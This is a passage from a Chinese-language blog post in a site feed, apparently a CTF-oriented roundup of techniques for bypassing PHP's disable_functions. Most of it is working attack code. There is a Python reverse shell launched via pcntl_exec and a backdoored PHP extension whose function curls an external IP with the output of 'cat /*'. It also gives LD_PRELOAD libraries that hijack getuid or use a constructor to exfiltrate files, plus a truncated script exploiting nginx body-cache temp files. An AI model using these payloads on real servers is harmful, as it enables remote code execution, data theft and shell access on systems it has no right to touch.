  </entry>
  
  <entry>
    <title>绕过disable_functions的方法总结</title>
    <link href="https://www.dr0n.top/posts/5f3ac2d3/"/>
    <id>https://www.dr0n.top/posts/5f3ac2d3/</id>
    <published>2024-07-17T04:00:00.000Z</published>
    <updated>2025-07-27T10:07:14.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常规函数函数绕过"><a href="#常规函数函数绕过" class="headerlink" title="常规函数函数绕过"></a>常规函数函数绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//exec</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><br><span class="hljs-comment">//shell_exec</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><br><span class="hljs-comment">//system</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><br><span class="hljs-comment">//passthru</span><br><span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br><br><span class="hljs-comment">//popen</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&quot;whoami&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-comment">//proc_open</span><br><span class="hljs-variable">$command</span>=<span class="hljs-string">&quot;whoami&quot;</span>; <span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)); <span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$command</span> ,<span class="hljs-variable">$descriptorspec</span> , <span class="hljs-variable">$pipes</span>); <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) &#123; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">1024</span>);&#125;<br></code></pre></td></tr></table></figure><p>如果安装了 pcntl 插件，则可以利用pcntl_exec来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#exec.php</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">pcntl_exec</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/tmp/exp.sh&quot;</span>));<span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#/tmp/exp.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br>ls -l /<br></code></pre></td></tr></table></figure><p>或者与python结合来反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">pcntl_exec</span>(<span class="hljs-string">&quot;/usr/bin/python3&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;IP&quot;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));<br></code></pre></td></tr></table></figure><h1 id="使用ext-skel制作恶意php扩展"><a href="#使用ext-skel制作恶意php扩展" class="headerlink" title="使用ext_skel制作恶意php扩展"></a>使用ext_skel制作恶意php扩展</h1><p>disable_fuctions禁用的是php的函数，使用php扩展调用c的函数即可绕过</p><p>这种利用方式的条件较为苛刻</p><p>1：知道扩展目录并且目录可写（覆盖到已经引用的扩展，比如mysqli.so）<br>2：能够载入php扩展（重启或者使用php命令行执行）<br>3：能够调用自定义函数</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$action</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;phpinfo&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;run&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;php -r &#x27;ctfshow();&#x27;&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><blockquote><p>ext_skel是php源码包里自带的一个开发生成工具</p></blockquote><p>首先在PHP源码下的ext目录下执行</p><p><code>php ext_skel.php --ext backdoor --std</code></p><p>运行后会生成一个backdoor目录，然后修改生成的c文件的代码</p><ol><li>在头部添加 stdlib.h ，例子中的23行</li><li>修改函数名，几处函数名要一致，例如37行和98行的函数名对应，这里用的是ctfshow</li><li>在自定义函数中添加system执行命令即可，例如40行</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   +----------------------------------------------------------------------+</span><br><span class="hljs-comment">   | PHP Version 7                                                        |</span><br><span class="hljs-comment">   +----------------------------------------------------------------------+</span><br><span class="hljs-comment">   | Copyright (c) The PHP Group                                          |</span><br><span class="hljs-comment">   +----------------------------------------------------------------------+</span><br><span class="hljs-comment">   | This source file is subject to version 3.01 of the PHP license,      |</span><br><span class="hljs-comment">   | that is bundled with this package in the file LICENSE, and is        |</span><br><span class="hljs-comment">   | available through the world-wide-web at the following url:           |</span><br><span class="hljs-comment">   | http://www.php.net/license/3_01.txt                                  |</span><br><span class="hljs-comment">   | If you did not receive a copy of the PHP license and are unable to   |</span><br><span class="hljs-comment">   | obtain it through the world-wide-web, please send a note to          |</span><br><span class="hljs-comment">   | license@php.net so we can mail you a copy immediately.               |</span><br><span class="hljs-comment">   +----------------------------------------------------------------------+</span><br><span class="hljs-comment">   | Author:  |</span><br><span class="hljs-comment">   +----------------------------------------------------------------------+</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> HAVE_CONFIG_H</span><br><span class="hljs-meta"># <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;php.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ext/standard/info.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;php_backdoor.h&quot;</span></span><br><br><span class="hljs-comment">/* For compatibility with older PHP versions */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span><br><span class="hljs-meta">        ZEND_PARSE_PARAMETERS_START(0, 0) \</span><br><span class="hljs-meta">        ZEND_PARSE_PARAMETERS_END()</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* &#123;&#123;&#123; void backdoor_test1()</span><br><span class="hljs-comment"> */</span><br>PHP_FUNCTION(ctfshow)<br>&#123;<br>        ZEND_PARSE_PARAMETERS_NONE();<br>        system(<span class="hljs-string">&quot;curl http://47.99.77.52:6666/?s=`cat /*`&quot;</span>);<br>&#125;<br><span class="hljs-comment">/* &#125;&#125;&#125; */</span><br><br><span class="hljs-comment">/* &#123;&#123;&#123; string backdoor_test2( [ string $var ] )</span><br><span class="hljs-comment"> */</span><br>PHP_FUNCTION(backdoor_test2)<br>&#123;<br>        <span class="hljs-type">char</span> *var = <span class="hljs-string">&quot;World&quot;</span>;<br>        <span class="hljs-type">size_t</span> var_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;World&quot;</span>) - <span class="hljs-number">1</span>;<br>        zend_string *retval;<br><br>        ZEND_PARSE_PARAMETERS_START(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>                Z_PARAM_OPTIONAL<br>                <span class="hljs-title function_">Z_PARAM_STRING</span><span class="hljs-params">(var, var_len)</span><br>        <span class="hljs-title function_">ZEND_PARSE_PARAMETERS_END</span><span class="hljs-params">()</span>;<br><br>        retval = strpprintf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;Hello %s&quot;</span>, var);<br><br>        RETURN_STR(retval);<br>&#125;<br><span class="hljs-comment">/* &#125;&#125;&#125;*/</span><br><br><span class="hljs-comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span><br><span class="hljs-comment"> */</span><br>PHP_RINIT_FUNCTION(backdoor)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_BACKDOOR)</span><br>        ZEND_TSRMLS_CACHE_UPDATE();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>        <span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-comment">/* &#125;&#125;&#125; */</span><br><br><span class="hljs-comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span><br><span class="hljs-comment"> */</span><br>PHP_MINFO_FUNCTION(backdoor)<br>&#123;<br>        php_info_print_table_start();<br>        php_info_print_table_header(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;backdoor support&quot;</span>, <span class="hljs-string">&quot;enabled&quot;</span>);<br>        php_info_print_table_end();<br>&#125;<br><span class="hljs-comment">/* &#125;&#125;&#125; */</span><br><br><span class="hljs-comment">/* &#123;&#123;&#123; arginfo</span><br><span class="hljs-comment"> */</span><br>ZEND_BEGIN_ARG_INFO(arginfo_backdoor_test1, <span class="hljs-number">0</span>)<br>ZEND_END_ARG_INFO()<br><br>ZEND_BEGIN_ARG_INFO(arginfo_backdoor_test2, <span class="hljs-number">0</span>)<br>        ZEND_ARG_INFO(<span class="hljs-number">0</span>, str)<br>ZEND_END_ARG_INFO()<br><span class="hljs-comment">/* &#125;&#125;&#125; */</span><br><br><span class="hljs-comment">/* &#123;&#123;&#123; backdoor_functions[]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> zend_function_entry backdoor_functions[] = &#123;<br>        PHP_FE(ctfshow,         arginfo_backdoor_test1)<br>        PHP_FE(backdoor_test2,          arginfo_backdoor_test2)<br>        PHP_FE_END<br>&#125;;<br><span class="hljs-comment">/* &#125;&#125;&#125; */</span><br><br><span class="hljs-comment">/* &#123;&#123;&#123; backdoor_module_entry</span><br><span class="hljs-comment"> */</span><br>zend_module_entry backdoor_module_entry = &#123;<br>        STANDARD_MODULE_HEADER,<br>        <span class="hljs-string">&quot;backdoor&quot;</span>,                                     <span class="hljs-comment">/* Extension name */</span><br>        backdoor_functions,                     <span class="hljs-comment">/* zend_function_entry */</span><br>        <span class="hljs-literal">NULL</span>,                                                   <span class="hljs-comment">/* PHP_MINIT - Module initialization */</span><br>        <span class="hljs-literal">NULL</span>,                                                   <span class="hljs-comment">/* PHP_MSHUTDOWN - Module shutdown */</span><br>        PHP_RINIT(backdoor),                    <span class="hljs-comment">/* PHP_RINIT - Request initialization */</span><br>        <span class="hljs-literal">NULL</span>,                                                   <span class="hljs-comment">/* PHP_RSHUTDOWN - Request shutdown */</span><br>        PHP_MINFO(backdoor),                    <span class="hljs-comment">/* PHP_MINFO - Module info */</span><br>        PHP_BACKDOOR_VERSION,           <span class="hljs-comment">/* Version */</span><br>        STANDARD_MODULE_PROPERTIES<br>&#125;;<br><span class="hljs-comment">/* &#125;&#125;&#125; */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> COMPILE_DL_BACKDOOR</span><br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> ZTS</span><br>ZEND_TSRMLS_CACHE_DEFINE()<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>ZEND_GET_MODULE(backdoor)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>然后编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">phpize<br>./configure<br>make<br>make install<br></code></pre></td></tr></table></figure><p>就会在modules目录下生成.so文件，然后将生成的恶意文件上传或写入到目标的扩展目录，使用<code>php -r</code>调用，就能执行自定义的命令了</p><p>注意，如果制作so的环境的php版本于靶机的php版本不同，则可能会产生如下错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Warning: PHP Startup: backdoor: Unable to initialize module<br>Module compiled with module API=20190902<br>PHP    compiled with module API=20180731<br>These options need to match<br> <span class="hljs-keyword">in</span> Unknown on line 0<br><br>Deprecated: Directive <span class="hljs-string">&#x27;track_errors&#x27;</span> is deprecated <span class="hljs-keyword">in</span> Unknown on line 0<br><br>Fatal error: Uncaught Error: Call to undefined <span class="hljs-keyword">function</span> ctfshow() <span class="hljs-keyword">in</span> Command line code:1<br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;</span><br>  thrown <span class="hljs-keyword">in</span> Command line code on line 1<br></code></pre></td></tr></table></figure><p>这时候需要修改<code>/usr/include/php/20190902/Zend/zend_modules.h</code>(具体路径可能不一致)文件中的<code>ZEND_MODULE_API_NO</code>的值为上面报错中的值<code>20180731</code></p><p>然后编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">make clean<br>phpize<br>./configure<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><h1 id="利用-LD-PRELOAD-环境变量"><a href="#利用-LD-PRELOAD-环境变量" class="headerlink" title="利用 LD_PRELOAD 环境变量"></a>利用 LD_PRELOAD 环境变量</h1><blockquote><p>LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。</p></blockquote><p>总的来说就是通过LD_PRELOAD指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果</p><p>需要的条件如下</p><ol><li>创建的恶意so文件可以上传到目标主机</li><li>能够控制 LD_PRELOAD 环境变量的值，比如 putenv() 函数</li><li>需要通过某个可以创建新进程的函数来加载 LD_PRELOAD 中的 .so 文件，比如 mail()、imap_mail()、mb_send_mail() 和 error_log() 函数等</li></ol><h2 id="劫持系统函数"><a href="#劫持系统函数" class="headerlink" title="劫持系统函数"></a>劫持系统函数</h2><p>在php中启动新进程时会自动调用许多的函数和api等等，其中 getuid 函数来确认进程属主(执行权限）</p><p>通过<code>man 2 getuid</code>查看函数原型</p><p>可以发现没有参数并且很常用，符合劫持函数的要求</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs text">GETUID(2)                                                        Linux Programmer&#x27;s Manual                                                        GETUID(2)<br><br>NAME<br>       getuid, geteuid - get user identity<br><br>SYNOPSIS<br>       #include &lt;unistd.h&gt;<br>       #include &lt;sys/types.h&gt;<br><br>       uid_t getuid(void);<br>       uid_t geteuid(void);<br><br>DESCRIPTION<br>       getuid() returns the real user ID of the calling process.<br><br>       geteuid() returns the effective user ID of the calling process.<br><br>ERRORS<br>       These functions are always successful.<br></code></pre></td></tr></table></figure><p>劫持getuid</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span>&#123;<br>        system(<span class="hljs-string">&quot;curl http://url:port?s=`cat /*`&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">getuid</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-keyword">if</span>(getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)==<span class="hljs-literal">NULL</span>)&#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br>        unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>        payload();<br>&#125;<br></code></pre></td></tr></table></figure><p>生成动态链接库</p><p><code>gcc -c -fPIC hack.c -o hack &amp;&amp; gcc --share hack -o hack.so</code></p><p>将 hack.so 上传并通过环境变量 LD_PRELOAD 指定后，只要新建进程，就会执行我们的恶意代码</p><p>php中部分可以新建进程的函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">system<br>shell_exec<br>exec<br>passthru<br>proc_open<br>popen<br>pcntl<br>mail<br>imap_mail<br>mb_send_mail<br>error_log<br>libvirt_connect<br>gnupg_init<br>imagick<br></code></pre></td></tr></table></figure><p>还可以通过<code>strace -f php 1.php 2&gt;&amp;1 | grep execve</code>命令来查看是否创建了新的进程</p><p><img src="/img/summary/disable_functions-1.png"></p><h2 id="劫持启动进程"><a href="#劫持启动进程" class="headerlink" title="劫持启动进程"></a>劫持启动进程</h2><p>但是某些函数并不会调用getuid或者被禁用，这时候就需要更加通用的方式，不局限于劫持某一函数</p><p>在 GCC 中有个 C 语言扩展修饰符 __attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute__((constructor)) 修饰的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span>** environ;<br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; environ[i]; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(environ[i], <span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)) &#123;<br>                    environ[i][<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>    &#125;<br>    system(<span class="hljs-string">&quot;curl http://url:port?s=`cat /*`&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译</p><p><code>gcc -c -fPIC hack.c -o hack &amp;&amp; gcc --share hack -o hack.so</code></p><h2 id="无上传点时的利用姿势"><a href="#无上传点时的利用姿势" class="headerlink" title="无上传点时的利用姿势"></a>无上传点时的利用姿势</h2><p>当没有表面上的上传点时可以考虑利用临时文件</p><p><strong>一：php的临时文件</strong></p><p>php的临时文件一般在<code>/tmp</code>目录下，如果可以列目录看到文件名的话可以考虑利用，否则很难爆破文件名</p><p><strong>二：nginx的body缓存机制</strong></p><p>如果传输的数据大于16k，则nginx会缓存。虽然说nginx会保存文件，但是nginx会在转发给php-fpm后就删除掉了(在php解释执行之前)</p><p>这就不能直接利用了，需要用到linux的一个特性：<code>/proc/PID/fd/&#123;1&#125;</code>去读取（条件是php和nginx的执行用户名是相同的才可以访问）</p><p>一个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><br>ip = <span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span><br>port = <span class="hljs-number">28268</span><br>s = socket.socket()<br>s.connect((ip, port))<br><br><br><span class="hljs-comment"># 获取当前进程的pid</span><br>s.send(<span class="hljs-string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span><br><span class="hljs-string">Host:127.0.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.encode())<br>data = s.recv(<span class="hljs-number">1024</span>).decode()<br>s.close()<br>pid = re.findall(<span class="hljs-string">&#x27;(.*?) www-data&#x27;</span>, data)[<span class="hljs-number">0</span>].strip()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pid:&quot;</span>, pid)<br><br><br><span class="hljs-comment"># payload</span><br>payload = <span class="hljs-string">&quot;curl http://47.99.77.52:8888?a=`cat /f*`;&quot;</span> + <span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">500</span><br>length = <span class="hljs-built_in">len</span>(payload)<br><br><br><span class="hljs-comment"># 上传文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        s = socket.socket()<br>        s.connect((ip, port))<br>        x = <span 